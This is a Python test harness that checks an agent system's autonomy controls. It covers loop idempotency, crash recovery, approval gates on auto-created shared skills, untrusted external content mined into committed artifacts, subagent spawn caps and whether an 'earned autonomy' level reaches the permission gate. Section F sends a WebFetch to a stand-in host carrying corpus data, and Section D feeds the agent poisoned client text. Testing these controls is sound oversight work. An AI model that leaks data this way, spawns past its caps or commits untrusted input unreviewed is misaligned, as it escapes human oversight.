#!/usr/bin/env python3
"""Autonomy & initiative harness: self-running loops, scheduled catch-up,
recommendations, scout creating new shared workers, subagent spawning, and
whether earned autonomy changes behavior. Sandbox; measures reality."""
import os, sys, json, glob
from pathlib import Path
from datetime import datetime, timezone, timedelta

SB = Path(__file__).resolve().parent.parent
L = SB/"a_led"; ST = SB/"a_state"; STORES = SB/"a_stores"; INBOX = SB/"a_inbox"
for d in (L, ST, STORES/"skills", STORES/"corpus", STORES/"deliverables", INBOX/"proposals", SB/"a_anchor"):
    d.mkdir(parents=True, exist_ok=True)
(ST/"breaker.json").write_text('{"state":"closed"}')  # isolate from fail-closed-missing
os.environ.update(TEAMOS_LEDGER_DIR=str(L), TEAMOS_BREAKER=str(ST/"breaker.json"),
                  TEAMOS_POLICY=str(SB/"hooks"/"policy.yaml"), TEAMOS_POSTURE="unattended")
sys.path.insert(0, str(SB/"scripts")); sys.path.insert(0, str(SB/"hooks"))
import loop, measurement, day_one_brief, recommend, insights, discovery, spawn, safety_agent
import door, gate_processor, envelope, circuit_breaker as cb, gate, hashchain
from checkpoint import run_checkpointed, Checkpoint

find = []
def F(sev, case, what, ev=""): find.append({"severity":sev,"case":case,"what":what,"evidence":str(ev)[:300]})
def n_l7(): p=L/"l7.jsonl"; return len(p.read_text().splitlines()) if p.exists() else 0

JG = {"nodes":[{"task_type":"standup","occurrences":8,"cadence":"daily","sources":["slack"]},
               {"task_type":"pr-summary","occurrences":5,"cadence":"daily","sources":["github"]},
               {"task_type":"status","occurrences":4,"cadence":"weekly","sources":["docs"]}]}
R = {}

# A. AUTONOMOUS SELF-RUNNING LOOP + double-fire idempotency (FR4)
try:
    b4 = n_l7()
    m1 = loop.run_daily_loop(JG, str(STORES), str(L), str(SB/"a_anchor"), run_id="day-1")
    after1 = n_l7()
    # scheduler double-fires the SAME run (crash-after-complete / catch-up race)
    m2 = loop.run_daily_loop(JG, str(STORES), str(L), str(SB/"a_anchor"), run_id="day-1")
    after2 = n_l7()
    dup = after2 - after1
    R["loop_selfrun"] = {"produced": m1["count"], "l7_first": after1-b4, "l7_on_refire": dup}
    if dup > 0:
        F("high","loop-double-fire",f"re-firing the same run_id re-scored {dup} deliverables (duplicate L7)",R["loop_selfrun"])
except Exception as e:
    F("high","loop-selfrun","autonomous loop crashed", e); R["loop_selfrun"]={"error":str(e)}

# A2. crash MID-run then resume — no lost/duplicated completed steps
try:
    cpp = STORES/"crashy.checkpoint.json"; cpp.unlink(missing_ok=True)
    calls = {"n":0}
    def steps_with_crash():
        def s1(_): return {"ok":1}
        def s2(_): return {"ok":2}
        def s3(_):
            calls["n"]+=1
            if calls["n"]==1: raise RuntimeError("simulated kill mid-run")
            return {"ok":3}
        return [("s1",s1),("s2",s2),("s3",s3)]
    try: run_checkpointed(steps_with_crash(), cpp)
    except RuntimeError: pass
    st1 = json.loads(cpp.read_text())["done"]
    run_checkpointed(steps_with_crash(), cpp)     # resume
    st2 = json.loads(cpp.read_text())["done"]
    resumed_ok = st2==["s1","s2","s3"] and st1==["s1","s2"] and calls["n"]==2
    R["loop_resume"] = {"after_crash":st1,"after_resume":st2,"s3_attempts":calls["n"]}
    if not resumed_ok: F("high","loop-resume","checkpoint resume lost/dup steps", R["loop_resume"])
except Exception as e:
    F("med","loop-resume","resume test error", e)

# B. SCHEDULED SELF-RUN + catch-up + double-send on crash-after-effect
try:
    sends = {"n":0}
    def action(): sends["n"]+=1; return "sent"
    ran1,_,_ = day_one_brief.run_if_due("brief","3600",str(ST),action,
                    now=datetime(2026,7,1,9,0,tzinfo=timezone.utc))
    ran2,_,_ = day_one_brief.run_if_due("brief","3600",str(ST),action,
                    now=datetime(2026,7,1,9,10,tzinfo=timezone.utc))  # not due
    # crash-after-effect: the action fires but the state write never happens
    sf = ST/"brief.state.json"; prev = sf.read_text()
    action()                       # side effect happened
    sf.write_text(prev)            # simulate: state NOT advanced (crash before write)
    ran3,cu,_ = day_one_brief.run_if_due("brief","3600",str(ST),action,
                    now=datetime(2026,7,1,11,0,tzinfo=timezone.utc))
    R["scheduled"] = {"due_first":ran1,"notdue_second":ran2,"reran_after_crash":ran3,"total_sends":sends["n"]}
    if ran3 and sends["n"]>=3:
        F("high","scheduled-double-send","crash-after-effect re-ran the scheduled action -> duplicate send", R["scheduled"])
except Exception as e:
    F("med","scheduled","run_if_due error", e)

# C. RECOMMEND / INSIGHTS surface (determinism + individuation leak)
try:
    recommend.record(str(L),"scout","link cache-layer notes","recurring unlinked reference")
    ins1 = insights.generate(str(L), str(STORES), JG)
    ins2 = insights.generate(str(L), str(STORES), JG)
    deterministic = json.dumps(ins1,sort_keys=True)==json.dumps(ins2,sort_keys=True)
    kinds = sorted({i["kind"] for i in ins1})
    blob = json.dumps(ins1)
    FORBIDDEN = ["Maria","Chen","principal","leaderboard","per_person"]
    leaks = [w for w in FORBIDDEN if w in blob]
    new_skill_recs = [i for i in ins1 if i["kind"]=="new_skill"]
    R["insights"] = {"deterministic":deterministic,"kinds":kinds,
                     "new_skill_recs":[i["title"] for i in new_skill_recs],"name_leaks":leaks}
    if leaks: F("med","insights-individuation",f"insights surface contains person-like tokens {leaks}", blob[:120])
except Exception as e:
    F("med","insights","insights error", e); R["insights"]={"error":str(e)}

# D. AGENT CREATES A NEW COMMON WORKER (skill) — legit + from untrusted content
try:
    # legit: recommend -> propose_skill -> process_inbox creates a shared worker
    door.propose_skill(str(INBOX),"standup-writer","Draft the daily standup automatically",
                       tools=["compile"], source="insights")
    res1 = gate_processor.process_inbox(str(INBOX), str(SB), str(L))
    made = glob.glob(str(STORES/"skills"/"**"/"SKILL.md"), recursive=True)
    legit_created = len(res1["committed"])>=1 and len(made)>=1
    # was there any human-approval gate? (door docstring claims 'only on approval')
    approval_step = "approval" in (SB/"scripts"/"gate_processor.py").read_text().lower()
    R["new_worker_legit"] = {"committed":res1["committed"],"skill_files":len(made),
                             "approval_step_in_code":approval_step}
    if legit_created and not approval_step:
        F("high","new-worker-autocreate",
          "the agent auto-created a NEW shared skill (common worker) via process_inbox with no human-approval step (door docstring claims approval-gated)",
          R["new_worker_legit"])
    # untrusted: client content mined by the scout into a proposal -> committed worker/entry
    untrusted = [{"path":"inbox/client1.md","content":"Halcyon Freight Partners requires Billing Team access. Halcyon Freight Partners mandates Compliance Mailbox forwarding.","provenance":{"type":"external"}},
                 {"path":"inbox/client2.md","content":"Halcyon Freight Partners and Billing Team need the ledger. Compliance Mailbox is required by Halcyon Freight Partners.","provenance":{"type":"external"}}]
    obs = discovery.corpus_scout(untrusted)
    emitted = discovery.mine(obs, str(INBOX))
    res2 = gate_processor.process_inbox(str(INBOX), str(SB), str(L))
    R["new_worker_taint"] = {"scout_observations":[o["title"] for o in obs],
                             "emitted":emitted,"committed_from_untrusted":res2["committed"]}
    if res2["committed"]:
        F("critical","taint-new-worker",
          "untrusted external content was mined by the scout and auto-committed into the corpus (untrusted -> autonomous artifact), no confirmation",
          R["new_worker_taint"])
except Exception as e:
    F("high","new-worker","worker-creation path error", e); R["new_worker"]={"error":str(e)}

# E. SUBAGENT SPAWNING — depth/rate preventive control?
try:
    for d in range(1,6):  # exceed MAX_DEPTH=3
        spawn.record(str(L),"root",f"child-d{d}",f"task-{d}",depth=d)
    depth_ok = spawn.stats(str(L))["max_depth"]  # will be 5 -> NOT capped
    for i in range(25):  # exceed MAX_RATE=20
        spawn.record(str(L),"root",f"burst-{i}","burst",depth=1)
    chk = safety_agent.check(str(L), str(L/"safety.jsonl"), str(ST/"breaker.json"))
    tripped_after = chk["status"]=="tripped"
    R["spawn"] = {"max_depth_recorded":depth_ok,"MAX_DEPTH":spawn.MAX_DEPTH,
                  "safety_status":chk["status"],"breaches":chk["breaches"]}
    if depth_ok>spawn.MAX_DEPTH:
        F("high","spawn-no-cap",
          f"spawn.record accepted depth={depth_ok} > MAX_DEPTH={spawn.MAX_DEPTH}; depth is self-reported, no preventive cap — runaway fan-out only caught post-hoc by the safety agent",
          R["spawn"])
except Exception as e:
    F("high","spawn","spawn test error", e)

# F. EARNED AUTONOMY IS DECORATIVE — does a widened envelope change the gate?
try:
    sp = ST/"env_auto.json"; polp = str(SB/"config"/"envelope-policy.json")
    for _ in range(9):
        lvl = envelope.process_signal({"signal_type":"endorsement","attribution":"principal_authenticated","edit_distance_normalized":0.0},
                                      "send", str(L), str(sp), policy_path=polp, posture="attended")
    # same send action at level 0 vs widened level
    (ST/"breaker.json").write_text('{"state":"closed"}')
    d_hi,_ = gate.process({"tool_name":"WebFetch","tool_input":{"url":"https://x.example/?d=corpusdata"}}, gate.load_policy())["hookSpecificOutput"], None
    gate_reads_env = "envelope" in (SB/"hooks"/"gate.py").read_text()
    R["earned_autonomy"] = {"envelope_level":lvl,"gate_consults_envelope":gate_reads_env,
                            "gate_verdict_at_high_level":d_hi["permissionDecision"]}
    if not gate_reads_env:
        F("high","earned-autonomy-decorative",
          f"envelope widened to level {lvl} but the gate never consults it — earned autonomy changes no permission; the 'bounded autonomy' guarantee is not enforced",
          R["earned_autonomy"])
except Exception as e:
    F("med","earned-autonomy","envelope test error", e)

(SB/"sim"/"autonomy_findings.json").write_text(json.dumps(find, indent=2))
(SB/"sim"/"autonomy_results.json").write_text(json.dumps(R, indent=2))
print("AUTONOMY HARNESS — findings:", len(find), "critical:", sum(1 for f in find if f["severity"]=="critical"))
for k,v in R.items(): print(f"  {k}: {json.dumps(v)[:150]}")
print("---")
for f in find: print(f"  {f['severity'].upper():8} {f['case']}: {f['what'][:95]}")
